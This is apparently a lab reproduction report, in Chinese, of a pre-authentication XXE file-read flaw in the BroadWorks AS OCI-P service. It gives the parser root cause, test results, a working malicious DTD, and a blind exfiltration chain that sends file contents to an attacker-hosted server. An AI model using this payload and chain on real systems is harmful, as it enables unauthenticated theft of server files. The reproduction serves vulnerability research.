# bwas_2026.06_1.251 — BroadWorks AS OCI-P 认证前 XXE 本地文件读取

> 利用方式标注：**纯网络攻击复现（未认证）**。已从攻击机（不 SSH 进目标）直接向 `192.168.188.x:2208`（明文）/`2209`（TLS）发送**单条** OCI XML 触发，未使用任何凭据；恶意 DTD 由第三方可控主机 `192.168.188.x:18080` 承载（AS 可回连，第三方侧留有回调日志）。同一响应内**既内联返回目标本地文件内容、又返回 `[Error 5404] Unauthorized transaction`**，证明认证前成立。
> 固有前提：需攻击者可控且被 AS 可达的 DTD 宿主（外部 DTD 型文件读取的必要条件；无外部 DTD 时 `file://` 只返回 6002 解析错误）。
> CVE 归属：用户口径为 CVE-2026-20320（Cisco BroadWorks OCI-P XXE，修复线 RI.2026.07）；**advisory 原文不可访问，未逐条核对**，故本目录以漏洞名命名，未使用 CVE 号。

## 概览

- **目标**：bwas_2026.06_1.251（内网 192.168.188.x，SSH 凭据见本地台账）
- **OS**：Rocky Linux 9.7
- **受影响组件/版本**：BroadWorks AS `AS_Rel_2026.06_1.251`（活动补丁 0）；OCS 容器（`java`，pid 8133）的 OCI 客户端端口 `2208/tcp`（明文）、`2209/tcp`（TLS），监听 `0.0.0.0`
- **漏洞类型**：XML 外部实体注入（CWE-611）→ 服务端本地文件读取
- **根因**：`com.broadsoft.util.OCIMessageCodec$Parser` **只**设置了 `external-general-entities=false`，未设置 `external-parameter-entities=false`、未设置 `disallow-doctype-decl`、未设置 `load-external-dtd=false`；而 `OciMessage` 构造函数立即 `codec.parse(message)`，**解析先于鉴权**。因此外部参数实体与外部 DTD 子集仍被解析，形成可绕过的半缓解。

## 证据（代码级）

`com.broadsoft.util.OCIMessageCodec$Parser` 构造（运行中 jar `CommonUtilities.jar`，构建 2026-06-23）：

```java
saxFactory = SAXParserFactory.newInstance();
saxFactory.setNamespaceAware(true);
saxFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
// 未设置 external-parameter-entities=false / disallow-doctype-decl / load-external-dtd=false
parser = saxFactory.newSAXParser();
this.setParent(parser.getXMLReader());
```

入口侧：`ClientTcpServer` 用 `TcpSimpleXmlReader` 按 XML 文档边界切分（根元素 `BroadsoftDocument`），按报文 `protocol="..."` 属性选处理器，`OciManager` 注册名 `"OCI"` → 2208/2209 是**纯 TCP XML 流**，没有 BCCT 协议注册握手；`OciMessage` 构造即解析，**解析发生在鉴权判定之前**。

## 复现结果：✅ 已复现（完整链打通）

环境角色：攻击机 `172.21.239.x`（经 `192.168.188.x` NAT 访问目标）→ 目标 `192.168.188.x:2208/2209`；攻击者 DTD 宿主为第三方主机 `192.168.188.x:18080`（实测 AS 可达）。

| 测试 | 请求/载荷 | 结果 |
|---|---|---|
| T1 基线 | 单条未认证 OCI XML（`LoginRequest14sp4`） | `[Error 5404] Unauthorized transaction`，且回显 `sessionId` → 未认证即完成解析 |
| T2 对照 | 外部通用实体 `<!ENTITY g SYSTEM "http://…/GEN_ENTITY">` | 回调**无请求**，`<sessionId/>` 为空 → 通用实体确被禁用 |
| T3 | 内部子集外部参数实体 `<!ENTITY % p SYSTEM "http://…/PARAM_ENTITY">%p;` | 回调收到 `GET /PARAM_ENTITY`（UA `Java/11.0.31`） |
| T4 | `<!DOCTYPE BroadsoftDocument SYSTEM "http://…/EXT_DTD">` | 回调收到 `GET /EXT_DTD` → 外部 DTD 子集被加载 |
| T5 | 盲 XXE：DTD 把 `file:///etc/hostname` 拼进出站 URL | 回调依次收到 `GET /evil.dtd`、`GET /LEAKED?data=202606.bwas.com` |
| T6 | 内联读取 `/etc/hostname`（2208） | 响应 `<sessionId xmlns="">202606.bwas.com</sessionId>` + `[Error 5404]`（413B） |
| T7 | 内联读取 `/etc/passwd`（2208） | 完整 `/etc/passwd`（2521B，含 `leo`/`bwadmin`/`bworks`/`lmadmin`/`ttadmin`） |
| T8 | 内联读取 `/usr/local/broadworks/AS_Rel_2026.06_1.251/conf/bcct.properties`（2208） | BroadWorks 配置内容内联返回（461B） |
| T9 | 内联读取 `/etc/hostname`（**2209/TLS**） | 同样内联返回 |
| T10 进程归属 | 第三方 DTD 拉取期间 AS 侧 `ss -tnp` | `192.168.188.x:35792 → 192.168.188.x:18080 users:(("java",pid=8133,fd=87))` 与 `:2208 ← 192.168.188.x:45120 users:(("java",pid=8133))` → 出站取 DTD 与 2208 监听**同属 OCS JVM pid 8133**，入站源为 NAT 后地址（非回环） |

恶意 DTD（由攻击者主机提供，target file 可替换）：

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY leak '%file;'>">
%wrap;
```

完整利用链：

```
攻击机 → 192.168.188.x:2208 (无认证, 单条 OCI XML)
  → TcpSimpleXmlReader 切分出 <BroadsoftDocument protocol="OCI"> 交给 OciManager("OCI")
  → OciMessage 构造即 codec.parse()（鉴权之前）
  → OCIMessageCodec$Parser 解析外部参数实体 / 加载外部 DTD（仅禁用了 general entities）
  → AS 出站 GET http://<攻击者DTD宿主>/evil2.dtd（第三方侧留痕）
  → 实体展开为本地文件内容，随 sessionId 内联进 5404 错误响应
```

## 影响与边界

- **认证要求**：**pre-auth**。全程无凭据；实体解析与文件内容回显早于 `5404 Unauthorized transaction` 判定。
- **权限结果**：以 OCS 进程身份（`bworks`）读取文件；`/etc/shadow` 被拒（`6002 Permission denied`），**不是 root 级任意文件读取**。
- **影响范围**：BroadWorks AS 本机、OCS 进程可读的任意文件（系统文件 + BroadWorks 配置文件），例如 `/etc/passwd`、`conf/bcct.properties`；文件内容随错误响应回显。错误响应还会泄露本地路径/权限信息。
- **固有前提**：需攻击者能让目标去取一份**攻击者可控且被 AS 可达**的 DTD。本次用第三方主机 `192.168.188.x` 真实满足（非目标机自托管）。
- **未做**：未验证代码执行/RCE；未验证 web 面（`OCIOverSoap`/`OCIFiles`）是否同一解析器复用同一缺陷。
